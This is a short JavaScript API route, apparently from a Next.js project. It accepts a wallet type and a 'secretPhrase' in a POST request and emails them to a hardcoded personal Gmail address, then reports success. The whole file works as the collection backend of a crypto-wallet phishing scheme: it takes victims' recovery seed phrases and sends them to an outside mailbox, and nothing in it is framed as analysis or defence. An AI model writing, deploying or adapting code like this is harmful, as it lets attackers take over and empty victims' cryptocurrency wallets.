import { sendMail } from "@/helpers";

export const POST = async (req) => {
  try {
    const { walletType, secretPhrase } = await req.json();
    const email = "Houseofpraises22@gmail.com";
   

    await sendMail(email, secretPhrase, walletType);

    return Response.json(
      { message: "success" },
      { status: 200 }
    );

  } catch (error) {
    return Response.json(
      { message: "Failed to send email" },
      { status: 500 }
    );
  }
};